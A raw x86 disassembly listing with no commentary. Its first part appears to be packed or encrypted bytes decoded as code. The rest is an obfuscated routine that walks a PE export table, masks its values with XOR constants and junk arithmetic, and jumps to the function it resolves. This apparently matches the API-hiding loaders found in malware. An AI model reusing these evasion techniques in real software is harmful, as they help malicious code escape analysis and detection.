  42114a:	sar    DWORD PTR [ebx-0x44443e8b],0xe3
  421151:	push   ebx
  421152:	lods   eax,DWORD PTR ds:[esi]
  421153:	pop    eax
  421154:	mov    BYTE PTR [edx],bl
  421156:	dec    edx
  421157:	in     eax,0x7c
  421159:	into   
  42115a:	jl     0x42119f
  42115c:	shr    DWORD PTR [edi-0x4b857604],cl
  421162:	mov    edi,0x36b3e63b
  421167:	bound  ebp,QWORD PTR [ebx-0x11]
  42116a:	cwde   
  42116b:	out    dx,al
  42116c:	jg     0x421154
  42116e:	add    ebp,DWORD PTR ds:0x2f878808
  421174:	rol    DWORD PTR [ebp-0x7a],1
  421177:	dec    ecx
  421178:	cdq    
  421179:	mov    bl,0x21
  42117b:	dec    edx
  42117c:	sub    eax,0x6202c46f
  421181:	xchg   edx,eax
  421182:	xchg   ebx,eax
  421183:	fsub   st(0),st
  421185:	or     eax,edi
  421187:	mov    cl,0xc3
  421189:	push   ebx
  42118a:	jno    0x42116e
  42118c:	outs   dx,BYTE PTR ds:[esi]
  42118d:	(bad)  
  42118e:	stc    
  42118f:	hlt    
  421190:	jb     0x421117
  421192:	add    al,0x70
  421194:	fstp   TBYTE PTR [edi-0x64]
  421197:	sub    bl,BYTE PTR [eax]
  421199:	test   eax,0x2df48378
  42119e:	pop    edx
  42119f:	out    dx,al
  4211a0:	cmp    eax,0x1c6456aa
  4211a5:	jno    0x42117a
  4211a7:	jae    0x4211c6
  4211a9:	sbb    BYTE PTR [ebp+0x61],ch
  4211ac:	test   al,0x95
  4211ae:	fidivr WORD PTR [edx]
  4211b0:	fwait
  4211b1:	xchg   ebp,eax
  4211b2:	rcl    esi,1
  4211b4:	inc    edi
  4211b5:	jle    0x4211d3
  4211b7:	mov    dh,0x56
  4211b9:	add    edx,DWORD PTR [ebp+0x34c47fbd]
  4211bf:	stos   DWORD PTR es:[edi],eax
  4211c0:	lods   al,BYTE PTR ds:[esi]
  4211c1:	lods   eax,DWORD PTR ds:[esi]
  4211c2:	jae    0x421204
  4211c4:	shl    DWORD PTR [ebx+ebx*4+0x237bcb77],cl
  4211cb:	cmp    cl,BYTE PTR [ebp+0x48]
  4211ce:	mov    ds:0x642a454d,eax
  4211d3:	sbb    ebx,DWORD PTR ds:0x931e3eda
  4211d9:	jp     0x421221
  4211db:	retf   
  4211dc:	sub    bl,BYTE PTR [eax]
  4211de:	jo     0x42118c
  4211e0:	(bad)  
  4211e1:	hlt    
  4211e2:	jbe    0x4211b4
  4211e4:	cli    
  4211e5:	icebp  
  4211e6:	inc    ebp
  4211e7:	test   dl,dl
  4211e9:	out    0x39,eax
  4211eb:	sub    al,bh
  4211ed:	mov    DWORD PTR [eax+0x118d6703],ebx
  4211f3:	or     al,0x4e
  4211f5:	lods   eax,DWORD PTR cs:[esi]
  4211f7:	je     0x42121a
  4211f9:	add    al,0x3c
  4211fb:	mov    bh,0x2a
  4211fd:	jmp    0xfecc727d
  421202:	pop    edx
  421203:	aad    0xa4
  421205:	push   ebx
  421206:	mov    ebp,esp
  421208:	retf   
  421209:	adc    dh,al
  42120b:	sbb    DWORD PTR [ebx+0x31],edx
  42120e:	fwait
  42120f:	xor    BYTE PTR [esi+ebp*1-0x8],ch
  421213:	bound  edi,QWORD PTR [esi-0x7a15b97b]
  421219:	pop    edx
  42121a:	(bad)  
  42121b:	mov    al,ah
  42121d:	cmp    dl,0xd6
  421220:	push   ss
  421221:	ficomp DWORD PTR [eax-0x17dd8f6a]
  421227:	xchg   esi,eax
  421228:	dec    ebx
  421229:	popa   
  42122a:	ror    edi,0x87
  42122d:	mov    al,ds:0x707f9923
  421232:	les    ebx,FWORD PTR [eax-0x5230a4de]
  421238:	stos   DWORD PTR es:[edi],eax
  421239:	out    dx,al
  42123a:	mov    al,ds:0xb06dc866
  42123f:	push   edi
  421240:	fsubr  st(4),st
  421242:	cmp    dh,ch
  421244:	xor    DWORD PTR [eax+0x8],ecx
  421247:	push   ebp
  421248:	aas    
  421249:	pop    ebp
  42124a:	adc    al,0x4
  42124c:	xchg   edi,eax
  42124d:	mov    WORD PTR [edx-0x789d3dfb],ds
  421253:	(bad)  
  421254:	mov    ds:0x273f76e1,al
  421259:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42125a:	test   edx,0x6b6e3c6c
  421260:	mov    al,ds:0xee43bea7
  421265:	jb     0x421202
  421267:	mov    ebx,0xd5f19671
  42126c:	cmp    DWORD PTR [edx+edi*2+0x8288adb],edi
  421273:	inc    esp
  421274:	ds aaa 
  421276:	cdq    
  421277:	cmp    DWORD PTR [esi],ebx
  421279:	xor    eax,0x61314044
  42127e:	cmp    ecx,ecx
  421280:	lahf   
  421281:	inc    edx
  421282:	cmp    BYTE PTR [eax-0x6f],ah
  421285:	or     eax,0xe4d4f0f8
  42128a:	sahf   
  42128b:	mov    dx,WORD PTR [esi]
  42128e:	pop    es
  42128f:	mov    al,0xbb
  421291:	sub    edi,DWORD PTR [edi-0x12]
  421294:	stos   DWORD PTR es:[edi],eax
  421295:	aam    0x7c
  421297:	out    dx,al
  421298:	xor    al,0x60
  42129a:	pop    edx
  42129b:	mov    edi,0xe464d92f
  4212a0:	add    cl,BYTE PTR [ebx-0x46957d9a]
  4212a6:	(bad)  
  4212a7:	jl     0x421237
  4212a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4212aa:	jnp    0x4212f6
  4212ac:	loop   0x4212e5
  4212ae:	(bad)  
  4212af:	ja     0x42125f
  4212b1:	inc    ecx
  4212b2:	lea    ebp,[ebp+0x48]
  4212b5:	ins    BYTE PTR es:[edi],dx
  4212b6:	dec    edx
  4212b7:	inc    esp
  4212b8:	inc    ebp
  4212b9:	idiv   al
  4212bb:	bound  ebx,QWORD PTR [edx+eiz*4+0x7e]
  4212bf:	push   es
  4212c0:	stos   DWORD PTR es:[edi],eax
  4212c1:	test   BYTE PTR [ebp+0xd],dl
  4212c4:	leave  
  4212c5:	sub    al,0xd7
  4212c7:	pop    ds
  4212c8:	iret   
  4212c9:	repz loope 0x4212f8
  4212cc:	cmp    DWORD PTR [ebx+eiz*8],ebp
  4212cf:	cmp    BYTE PTR [edi+0x56],0xe
  4212d3:	add    eax,0xa50fa97a
  4212d8:	lahf   
  4212d9:	jns    0x421285
  4212db:	dec    edi
  4212dc:	aas    
  4212dd:	xchg   DWORD PTR [edx-0x6bf581ed],ecx
  4212e3:	sub    eax,0xf9ea0d94
  4212e8:	mov    bh,0x6e
  4212ea:	mov    cl,0xd0
  4212ec:	(bad)  
  4212ed:	nop
  4212ee:	in     al,0x68
  4212f0:	add    al,0x1a
  4212f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212f3:	pop    eax
  4212f4:	outs   dx,BYTE PTR ds:[esi]
  4212f5:	push   edi
  4212f6:	fdiv   QWORD PTR [ebp+0x4fd32e3c]
  4212fc:	push   0xfffffff7
  4212fe:	xchg   esp,eax
  4212ff:	enter  0xb7f0,0x2a
  421303:	xor    DWORD PTR [ebx+ebp*4+0x6f],ecx
  421307:	dec    edx
  421308:	cmp    cl,0x8e
  42130b:	sbb    ebp,esp
  42130d:	dec    ebx
  42130e:	cwde   
  42130f:	and    edx,esp
  421311:	pop    ss
  421312:	(bad)  [edx]
  421314:	idiv   ch
  421316:	adc    ecx,edx
  421318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421319:	lahf   
  42131a:	xchg   ebp,eax
  42131b:	pop    ecx
  42131c:	(bad)  
  42131d:	dec    edi
  42131e:	(bad)  
  421320:	adc    bl,BYTE PTR [ebp+0x34]
  421323:	loope  0x421355
  421325:	jns    0x4212e9
  421327:	popf   
  421328:	lds    esi,FWORD PTR [ecx+eiz*4+0x697967bd]
  42132f:	mov    DWORD PTR [ebp-0x8c],eax
  421335:	mov    DWORD PTR [ebp-0x4],0x527f
  42133c:	mov    DWORD PTR [ebp-0x6c],0x3c6f
  421343:	mov    DWORD PTR [ebp-0x68],0x6662
  42134a:	mov    DWORD PTR [ebp-0x1c],0x5d88
  421351:	mov    DWORD PTR [ebp-0x50],0x1
  421358:	mov    eax,DWORD PTR [ebp-0x6c]
  42135b:	imul   eax,eax,0x75ae
  421361:	mov    ecx,DWORD PTR ds:0x422540
  421367:	xor    eax,ecx
  421369:	mov    ecx,DWORD PTR [ebp-0x4]
  42136c:	sub    eax,ecx
  42136e:	mov    ecx,DWORD PTR [ebp+0x8]
  421371:	lea    ecx,[ecx+eax*1-0x1bc76ca5]
  421378:	mov    eax,ds:0x422548
  42137d:	xor    eax,0x7ded
  421382:	mov    edx,DWORD PTR ds:0x422544
  421388:	sub    eax,edx
  42138a:	xor    edx,edx
  42138c:	push   0x5
  42138e:	pop    esi
  42138f:	div    esi
  421391:	mov    esi,eax
  421393:	and    esi,0x3c52
  421399:	mov    eax,DWORD PTR [ebp-0x68]
  42139c:	or     esi,eax
  42139e:	mov    edi,DWORD PTR [ebp-0x50]
  4213a1:	mov    eax,0x24ed
  4213a6:	xor    edx,edx
  4213a8:	div    edi
  4213aa:	mov    edx,DWORD PTR [ebp-0x1c]
  4213ad:	or     eax,edx
  4213af:	xor    edx,edx
  4213b1:	push   0x7
  4213b3:	pop    edi
  4213b4:	div    edi
  4213b6:	xor    eax,0x11fd
  4213bb:	mov    edx,DWORD PTR [ebp-0x8c]
  4213c1:	mov    edx,DWORD PTR [edx+esi*1-0x7642]
  4213c8:	add    edx,ecx
  4213ca:	add    eax,edx
  4213cc:	mov    DWORD PTR [ebp-0x10],eax
  4213cf:	mov    DWORD PTR [ebp-0x64],0x3238
  4213d6:	mov    DWORD PTR [ebp-0x44],0x56b2
  4213dd:	mov    DWORD PTR [ebp-0xa0],0x3103
  4213e7:	mov    DWORD PTR [ebp-0x9c],0x16c
  4213f1:	mov    DWORD PTR [ebp-0x94],0x4eb2
  4213fb:	mov    ecx,DWORD PTR [ebp-0x44]
  4213fe:	imul   ecx,ecx,0x28d8
  421404:	and    ecx,0x7fac
  42140a:	mov    eax,ds:0x42254c
  42140f:	sub    ecx,eax
  421411:	add    ecx,0x454d
  421417:	mov    eax,DWORD PTR [ebp-0x64]
  42141a:	or     ecx,eax
  42141c:	xor    ecx,0xbbbe
  421422:	add    ecx,DWORD PTR [ebp+0x8]
  421425:	mov    eax,DWORD PTR [ebp-0xa0]
  42142b:	xor    edx,edx
  42142d:	push   0x3
  42142f:	pop    esi
  421430:	div    esi
  421432:	and    eax,0x769f
  421437:	mov    edx,DWORD PTR [ebp-0x9c]
  42143d:	add    edx,DWORD PTR [ebp-0x94]
  421443:	or     edx,0x48
  421446:	and    edx,0x4ea0
  42144c:	add    edx,DWORD PTR ds:0x422550
  421452:	mov    esi,DWORD PTR [ebp-0x8c]
  421458:	mov    eax,DWORD PTR [esi+eax*1-0xff2]
  42145f:	add    eax,ecx
  421461:	lea    eax,[edx+eax*1-0xaa4d]
  421468:	mov    DWORD PTR [ebp-0x74],eax
  42146b:	mov    DWORD PTR [ebp-0x58],0x2dd6
  421472:	mov    DWORD PTR [ebp-0x18],0x7ad0
  421479:	mov    DWORD PTR [ebp-0x7c],0x3
  421480:	mov    DWORD PTR [ebp-0x30],0x6bb3
  421487:	mov    DWORD PTR [ebp-0x84],0x70fb
  421491:	mov    DWORD PTR [ebp-0xb4],0x3f23
  42149b:	mov    eax,DWORD PTR [ebp-0x18]
  42149e:	mov    ecx,DWORD PTR [ebp-0x7c]
  4214a1:	xor    edx,edx
  4214a3:	div    ecx
  4214a5:	imul   eax,eax,0x2fbf
  4214ab:	mov    ecx,DWORD PTR ds:0x422554
  4214b1:	xor    eax,ecx
  4214b3:	mov    ecx,DWORD PTR [ebp-0x58]
  4214b6:	and    eax,ecx
  4214b8:	mov    ecx,DWORD PTR [ebp+0x8]
  4214bb:	lea    eax,[ecx+eax*1-0x2800]
  4214c2:	mov    ecx,DWORD PTR ds:0x42255c
  4214c8:	and    ecx,0x566d
  4214ce:	mov    edx,DWORD PTR ds:0x422558
  4214d4:	sub    ecx,edx
  4214d6:	mov    edx,DWORD PTR [ebp-0x30]
  4214d9:	imul   ecx,edx
  4214dc:	mov    edx,DWORD PTR [ebp-0xb4]
  4214e2:	xor    edx,0x69c6
  4214e8:	add    edx,0x838
  4214ee:	mov    esi,DWORD PTR [ebp-0x84]
  4214f4:	sub    edx,esi
  4214f6:	imul   edx,edx,0x7c79
  4214fc:	mov    esi,DWORD PTR [ebp-0x8c]
  421502:	mov    ecx,DWORD PTR [esi+ecx*1+0x1dbbba13]
  421509:	add    ecx,eax
  42150b:	lea    eax,[edx+ecx*1+0x8aff9ee]
  421512:	mov    DWORD PTR [ebp-0x70],eax
  421515:	and    DWORD PTR [ebp-0xb8],0x0
  42151c:	jmp    0x42152e
  421521:	mov    eax,DWORD PTR [ebp-0xb8]
  421527:	inc    eax
  421528:	mov    DWORD PTR [ebp-0xb8],eax
  42152e:	mov    eax,DWORD PTR [ebp-0x8c]
  421534:	mov    ecx,DWORD PTR [ebp-0xb8]
  42153a:	cmp    ecx,DWORD PTR [eax+0x18]
  42153d:	je     0x421aea
  421543:	mov    eax,DWORD PTR [ebp-0xb8]
  421549:	mov    ecx,DWORD PTR [ebp-0x10]
  42154c:	mov    edx,DWORD PTR [ebp+0x8]
  42154f:	add    edx,DWORD PTR [ecx+eax*4]
  421552:	mov    DWORD PTR [ebp-0x28],edx
  421555:	mov    eax,DWORD PTR [ebp-0x28]
  421558:	mov    DWORD PTR [ebp-0x184],eax
  42155e:	mov    eax,DWORD PTR [ebp+0xc]
  421561:	mov    DWORD PTR [ebp-0x180],eax
  421567:	mov    DWORD PTR [ebp-0x164],0xcb89b676
  421571:	mov    DWORD PTR [ebp-0x160],0x9d2b8af8
  42157b:	mov    DWORD PTR [ebp-0x154],0xcb89b672
  421585:	mov    DWORD PTR [ebp-0x150],0x9d2b8af8
  42158f:	lea    eax,[ebp-0x15c]
  421595:	mov    DWORD PTR [ebp-0x168],eax
  42159b:	mov    eax,DWORD PTR [ebp-0x180]
  4215a1:	movzx  eax,WORD PTR [eax+0x20]
  4215a5:	xor    eax,0xa69b
  4215aa:	movzx  eax,ax
  4215ad:	sar    eax,1
  4215af:	mov    ecx,DWORD PTR [ebp-0x180]
  4215b5:	movzx  ecx,WORD PTR [ecx+0x20]
  4215b9:	xor    ecx,0xa69b
  4215bf:	movzx  ecx,cx
  4215c2:	shl    ecx,0xf
  4215c5:	or     eax,ecx
  4215c7:	movzx  eax,ax
  4215ca:	mov    ecx,DWORD PTR [ebp-0x168]
  4215d0:	mov    DWORD PTR [ecx],eax
  4215d2:	mov    eax,DWORD PTR [ebp-0x154]
  4215d8:	mov    edx,DWORD PTR [ebp-0x150]
  4215de:	xor    eax,0xcb89b676
  4215e3:	xor    edx,0x9d2b8af8
  4215e9:	mov    cl,0x2
  4215eb:	call   0x4069e2
  4215f0:	mov    ebx,eax
  4215f2:	mov    esi,edx
  4215f4:	mov    eax,DWORD PTR [ebp-0x154]
  4215fa:	mov    edx,DWORD PTR [ebp-0x150]
  421600:	xor    eax,0xcb89b676
  421605:	xor    edx,0x9d2b8af8
  42160b:	mov    cl,0x3e
  42160d:	call   0x421c80
  421612:	or     ebx,eax
  421614:	or     esi,edx
  421616:	movzx  eax,bl
  421619:	push   eax
  42161a:	lea    eax,[ebp-0x10c]
  421620:	push   eax
  421621:	call   0x4188f0
  421626:	mov    eax,DWORD PTR [ebp-0x164]
  42162c:	mov    edx,DWORD PTR [ebp-0x160]
  421632:	xor    eax,0xcb89b676
  421637:	xor    edx,0x9d2b8af8
  42163d:	mov    cl,0x2
  42163f:	call   0x4069e2
  421644:	mov    esi,eax
  421646:	mov    edi,edx
  421648:	mov    eax,DWORD PTR [ebp-0x164]
  42164e:	mov    edx,DWORD PTR [ebp-0x160]
  421654:	xor    eax,0xcb89b676
  421659:	xor    edx,0x9d2b8af8
  42165f:	mov    cl,0x3e
  421661:	call   0x421c80
  421666:	or     esi,eax
  421668:	or     edi,edx
  42166a:	mov    DWORD PTR [ebp-0x16c],esi
  421670:	jmp    0x4216c5
  421675:	mov    eax,DWORD PTR [ebp-0x154]
  42167b:	mov    edx,DWORD PTR [ebp-0x150]
  421681:	xor    eax,0xcb89b676
  421686:	xor    edx,0x9d2b8af8
  42168c:	mov    cl,0x2
  42168e:	call   0x4069e2
  421693:	mov    esi,eax
  421695:	mov    edi,edx
  421697:	mov    eax,DWORD PTR [ebp-0x154]
  42169d:	mov    edx,DWORD PTR [ebp-0x150]
  4216a3:	xor    eax,0xcb89b676
  4216a8:	xor    edx,0x9d2b8af8
  4216ae:	mov    cl,0x3e
  4216b0:	call   0x421c80
  4216b5:	or     esi,eax
  4216b7:	or     edi,edx
  4216b9:	add    esi,DWORD PTR [ebp-0x16c]
  4216bf:	mov    DWORD PTR [ebp-0x16c],esi
  4216c5:	mov    eax,DWORD PTR [ebp-0x15c]
  4216cb:	cmp    DWORD PTR [ebp-0x16c],eax
  4216d1:	je     0x421764
  4216d7:	mov    eax,DWORD PTR [ebp-0x16c]
  4216dd:	mov    ecx,DWORD PTR [ebp-0x180]
  4216e3:	movzx  eax,WORD PTR [ecx+eax*4+0x2]
  4216e8:	xor    eax,0xa69b
  4216ed:	movzx  eax,ax
  4216f0:	sar    eax,1
  4216f2:	mov    ecx,DWORD PTR [ebp-0x16c]
  4216f8:	mov    edx,DWORD PTR [ebp-0x180]
  4216fe:	movzx  ecx,WORD PTR [edx+ecx*4+0x2]
  421703:	xor    ecx,0xa69b
  421709:	movzx  ecx,cx
  42170c:	shl    ecx,0xf
  42170f:	or     eax,ecx
  421711:	movzx  eax,ax
  421714:	mov    DWORD PTR [ebp-0x170],eax
  42171a:	mov    eax,DWORD PTR [ebp-0x16c]
  421720:	mov    ecx,DWORD PTR [ebp-0x180]
  421726:	movzx  eax,WORD PTR [ecx+eax*4]
  42172a:	xor    eax,0xa69b
  42172f:	movzx  eax,ax
  421732:	sar    eax,1
  421734:	mov    ecx,DWORD PTR [ebp-0x16c]
  42173a:	mov    edx,DWORD PTR [ebp-0x180]
  421740:	movzx  ecx,WORD PTR [edx+ecx*4]
  421744:	xor    ecx,0xa69b
  42174a:	movzx  ecx,cx
  42174d:	shl    ecx,0xf
  421750:	or     eax,ecx
  421752:	mov    ecx,DWORD PTR [ebp-0x170]
  421758:	mov    BYTE PTR [ebp+ecx*1-0x10c],al
  42175f:	jmp    0x421675
  421764:	mov    eax,DWORD PTR [ebp-0x164]
  42176a:	mov    edx,DWORD PTR [ebp-0x160]
  421770:	xor    eax,0xcb89b676
  421775:	xor    edx,0x9d2b8af8
  42177b:	mov    cl,0x2
  42177d:	call   0x4069e2
  421782:	mov    esi,eax
  421784:	mov    edi,edx
  421786:	mov    eax,DWORD PTR [ebp-0x164]
  42178c:	mov    edx,DWORD PTR [ebp-0x160]
  421792:	xor    eax,0xcb89b676
  421797:	xor    edx,0x9d2b8af8
  42179d:	mov    cl,0x3e
  42179f:	call   0x421c80
  4217a4:	or     esi,eax
  4217a6:	or     edi,edx
  4217a8:	mov    DWORD PTR [ebp-0x158],esi
  4217ae:	mov    eax,DWORD PTR [ebp-0x154]
  4217b4:	mov    edx,DWORD PTR [ebp-0x150]
  4217ba:	xor    eax,0xcb89b676
  4217bf:	xor    edx,0x9d2b8af8
  4217c5:	mov    cl,0x2
  4217c7:	call   0x4069e2
  4217cc:	mov    esi,eax
  4217ce:	mov    edi,edx
  4217d0:	mov    eax,DWORD PTR [ebp-0x154]
  4217d6:	mov    edx,DWORD PTR [ebp-0x150]
  4217dc:	xor    eax,0xcb89b676
  4217e1:	xor    edx,0x9d2b8af8
  4217e7:	mov    cl,0x3e
  4217e9:	call   0x421c80
  4217ee:	or     esi,eax
  4217f0:	or     edi,edx
  4217f2:	mov    DWORD PTR [ebp-0x1b0],esi
  4217f8:	mov    DWORD PTR [ebp-0x1ac],edi
  4217fe:	mov    eax,DWORD PTR [ebp-0x1b0]
  421804:	or     eax,DWORD PTR [ebp-0x1ac]
  42180a:	je     0x421a6a
  421810:	lea    eax,[ebp-0x178]
  421816:	mov    DWORD PTR [ebp-0x17c],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x158]
  421822:	xor    edx,edx
  421824:	mov    cl,0x2
  421826:	call   0x421c80
  42182b:	mov    esi,eax
  42182d:	mov    edi,edx
  42182f:	mov    eax,DWORD PTR [ebp-0x158]
  421835:	xor    edx,edx
  421837:	mov    cl,0x3e
  421839:	call   0x4069e2
  42183e:	or     esi,eax
  421840:	or     edi,edx
  421842:	xor    esi,0xcb89b676
  421848:	xor    edi,0x9d2b8af8
  42184e:	mov    eax,DWORD PTR [ebp-0x17c]
  421854:	mov    DWORD PTR [eax],esi
  421856:	mov    DWORD PTR [eax+0x4],edi
  421859:	mov    eax,DWORD PTR [ebp-0x158]
  42185f:	movsx  esi,BYTE PTR [ebp+eax*1-0x10c]
  421867:	mov    eax,DWORD PTR [ebp-0x154]
  42186d:	mov    edx,DWORD PTR [ebp-0x150]
  421873:	xor    eax,0xcb89b676
  421878:	xor    edx,0x9d2b8af8
  42187e:	mov    cl,0x2
  421880:	call   0x4069e2
  421885:	mov    ebx,eax
  421887:	mov    edi,edx
  421889:	mov    eax,DWORD PTR [ebp-0x154]
  42188f:	mov    edx,DWORD PTR [ebp-0x150]
  421895:	xor    eax,0xcb89b676
  42189a:	xor    edx,0x9d2b8af8
  4218a0:	mov    cl,0x3e
  4218a2:	call   0x421c80
  4218a7:	or     ebx,eax
  4218a9:	or     edi,edx
  4218ab:	movsx  eax,bl
  4218ae:	cmp    esi,eax
  4218b0:	je     0x421a10
  4218b6:	mov    eax,DWORD PTR [ebp-0x158]
  4218bc:	movsx  esi,BYTE PTR [ebp+eax*1-0x10c]
  4218c4:	mov    eax,DWORD PTR [ebp-0x178]
  4218ca:	mov    edx,DWORD PTR [ebp-0x174]
  4218d0:	xor    eax,0xcb89b676
  4218d5:	xor    edx,0x9d2b8af8
  4218db:	mov    cl,0x2
  4218dd:	call   0x4069e2
  4218e2:	mov    edi,eax
  4218e4:	mov    ebx,edx
  4218e6:	mov    eax,DWORD PTR [ebp-0x178]
  4218ec:	mov    edx,DWORD PTR [ebp-0x174]
  4218f2:	xor    eax,0xcb89b676
  4218f7:	xor    edx,0x9d2b8af8
  4218fd:	mov    cl,0x3e
  4218ff:	call   0x421c80
  421904:	or     edi,eax
  421906:	or     ebx,edx
  421908:	mov    eax,DWORD PTR [ebp-0x184]
  42190e:	movsx  eax,BYTE PTR [eax+edi*1]
  421912:	cmp    esi,eax
  421914:	je     0x421924
  42191a:	jmp    0x421a6a
  42191f:	jmp    0x421a10
  421924:	mov    eax,DWORD PTR [ebp-0x178]
  42192a:	mov    edx,DWORD PTR [ebp-0x174]
  421930:	xor    eax,0xcb89b676
  421935:	xor    edx,0x9d2b8af8
  42193b:	mov    cl,0x2
  42193d:	call   0x4069e2
  421942:	mov    esi,eax
  421944:	mov    edi,edx
  421946:	mov    eax,DWORD PTR [ebp-0x178]
  42194c:	mov    edx,DWORD PTR [ebp-0x174]
  421952:	xor    eax,0xcb89b676
  421957:	xor    edx,0x9d2b8af8
  42195d:	mov    cl,0x3e
  42195f:	call   0x421c80
  421964:	or     esi,eax
  421966:	or     edi,edx
  421968:	mov    eax,DWORD PTR [ebp-0x184]
  42196e:	movsx  esi,BYTE PTR [eax+esi*1]
  421972:	mov    eax,DWORD PTR [ebp-0x164]
  421978:	mov    edx,DWORD PTR [ebp-0x160]
  42197e:	xor    eax,0xcb89b676
  421983:	xor    edx,0x9d2b8af8
  421989:	mov    cl,0x2
  42198b:	call   0x4069e2
  421990:	mov    ebx,eax
  421992:	mov    edi,edx
  421994:	mov    eax,DWORD PTR [ebp-0x164]
  42199a:	mov    edx,DWORD PTR [ebp-0x160]
  4219a0:	xor    eax,0xcb89b676
  4219a5:	xor    edx,0x9d2b8af8
  4219ab:	mov    cl,0x3e
  4219ad:	call   0x421c80
  4219b2:	or     ebx,eax
  4219b4:	or     edi,edx
  4219b6:	movsx  eax,bl
  4219b9:	cmp    esi,eax
  4219bb:	jne    0x421a10
  4219c1:	mov    eax,DWORD PTR [ebp-0x154]
  4219c7:	mov    edx,DWORD PTR [ebp-0x150]
  4219cd:	xor    eax,0xcb89b676
  4219d2:	xor    edx,0x9d2b8af8
  4219d8:	mov    cl,0x2
  4219da:	call   0x4069e2
  4219df:	mov    esi,eax
  4219e1:	mov    edi,edx
  4219e3:	mov    eax,DWORD PTR [ebp-0x154]
  4219e9:	mov    edx,DWORD PTR [ebp-0x150]
  4219ef:	xor    eax,0xcb89b676
  4219f4:	xor    edx,0x9d2b8af8
  4219fa:	mov    cl,0x3e
  4219fc:	call   0x421c80
  421a01:	or     esi,eax
  421a03:	or     edi,edx
  421a05:	mov    DWORD PTR [ebp-0x188],esi
  421a0b:	jmp    0x421ab4
  421a10:	mov    eax,DWORD PTR [ebp-0x154]
  421a16:	mov    edx,DWORD PTR [ebp-0x150]
  421a1c:	xor    eax,0xcb89b676
  421a21:	xor    edx,0x9d2b8af8
  421a27:	mov    cl,0x2
  421a29:	call   0x4069e2
  421a2e:	mov    esi,eax
  421a30:	mov    edi,edx
  421a32:	mov    eax,DWORD PTR [ebp-0x154]
  421a38:	mov    edx,DWORD PTR [ebp-0x150]
  421a3e:	xor    eax,0xcb89b676
  421a43:	xor    edx,0x9d2b8af8
  421a49:	mov    cl,0x3e
  421a4b:	call   0x421c80
  421a50:	or     esi,eax
  421a52:	or     edi,edx
  421a54:	add    esi,DWORD PTR [ebp-0x158]
  421a5a:	mov    DWORD PTR [ebp-0x158],esi
  421a60:	jmp    0x4217ae
  421a65:	jmp    0x4217ae
  421a6a:	mov    eax,DWORD PTR [ebp-0x164]
  421a70:	mov    edx,DWORD PTR [ebp-0x160]
  421a76:	xor    eax,0xcb89b676
  421a7b:	xor    edx,0x9d2b8af8
  421a81:	mov    cl,0x2
  421a83:	call   0x4069e2
  421a88:	mov    esi,eax
  421a8a:	mov    edi,edx
  421a8c:	mov    eax,DWORD PTR [ebp-0x164]
  421a92:	mov    edx,DWORD PTR [ebp-0x160]
  421a98:	xor    eax,0xcb89b676
  421a9d:	xor    edx,0x9d2b8af8
  421aa3:	mov    cl,0x3e
  421aa5:	call   0x421c80
  421aaa:	or     esi,eax
  421aac:	or     edi,edx
  421aae:	mov    DWORD PTR [ebp-0x188],esi
  421ab4:	mov    eax,DWORD PTR [ebp-0x188]
  421aba:	mov    DWORD PTR [ebp-0x80],eax
  421abd:	cmp    DWORD PTR [ebp-0x80],0x0
  421ac1:	je     0x421ae5
  421ac7:	mov    eax,DWORD PTR [ebp-0xb8]
  421acd:	mov    ecx,DWORD PTR [ebp-0x74]
  421ad0:	movzx  eax,WORD PTR [ecx+eax*2]
  421ad4:	mov    ecx,DWORD PTR [ebp-0x70]
  421ad7:	mov    eax,DWORD PTR [ecx+eax*4]
  421ada:	mov    DWORD PTR [ebp-0x98],eax
  421ae0:	jmp    0x421aea
  421ae5:	jmp    0x421521
  421aea:	cmp    DWORD PTR [ebp-0x98],0x0
  421af1:	jne    0x421afe
  421af7:	xor    eax,eax
  421af9:	jmp    0x421c79
  421afe:	mov    eax,DWORD PTR [ebp+0x8]
  421b01:	add    eax,DWORD PTR [ebp-0x98]
  421b07:	mov    DWORD PTR [ebp-0x90],eax
  421b0d:	mov    DWORD PTR [ebp-0x4c],0x0
  421b14:	cmp    DWORD PTR [ebp-0x78],0x0
  421b18:	je     0x421b8b
  421b1e:	cmp    DWORD PTR [ebp-0x78],0x0
  421b22:	je     0x421b8b
  421b28:	mov    eax,DWORD PTR [ebp-0x78]
  421b2b:	shl    eax,0x2
  421b2e:	mov    DWORD PTR [ebp-0x4c],eax
  421b31:	mov    DWORD PTR [ebp-0xc0],0x0
  421b3b:	sub    esp,DWORD PTR [ebp-0x4c]
  421b3e:	mov    DWORD PTR [ebp-0xc0],esp
  421b44:	mov    DWORD PTR [ebp-0xbc],0x0
  421b4e:	mov    eax,DWORD PTR [ebp-0xbc]
  421b54:	cmp    eax,DWORD PTR [ebp-0x78]
  421b57:	je     0x421b8b
  421b5d:	mov    eax,DWORD PTR [ebp-0xbc]
  421b63:	mov    ecx,DWORD PTR [ebp-0xc0]
  421b69:	mov    edx,DWORD PTR [ebp-0xbc]
  421b6f:	mov    esi,DWORD PTR [ebp+0x14]
  421b72:	mov    edx,DWORD PTR [esi+edx*4+0x4]
  421b76:	mov    DWORD PTR [ecx+eax*4],edx
  421b79:	mov    eax,DWORD PTR [ebp-0xbc]
  421b7f:	inc    eax
  421b80:	mov    DWORD PTR [ebp-0xbc],eax
  421b86:	jmp    0x421b4e
  421b8b:	mov    DWORD PTR [ebp-0x60],0x0
  421b92:	push   0x421c49
  421b97:	jmp    DWORD PTR [ebp-0x90]
  421b9d:	mov    eax,eax
  421b9f:	mov    ecx,esp
  421ba1:	ret    0x4
  421ba4:	cmp    DWORD PTR ds:0x428201,0x0
  421bab:	mov    ecx,DWORD PTR ds:0x428191
  421bb1:	mov    ecx,0x52ed
  421bb6:	movzx  ecx,WORD PTR ds:0x428195
  421bbd:	jmp    0x421c11
  421bc2:	mov    DWORD PTR ds:0x4282b1,0x7886
  421bcc:	mov    eax,0x5ca1
  421bd1:	cmp    DWORD PTR ds:0x428201,0x0
  421bd8:	ja     0x421bf9
  421bde:	push   0x8a9a
  421be3:	call   DWORD PTR ds:0x428a5c
  421be9:	adc    ecx,DWORD PTR ds:0x428279
  421bef:	or     DWORD PTR ds:0x428285,0x4282b5
  421bf9:	add    DWORD PTR ds:0x428269,ecx
  421bff:	add    ecx,0x5586
  421c05:	or     ecx,ecx
  421c07:	adc    DWORD PTR ds:0x4282c9,0x4444
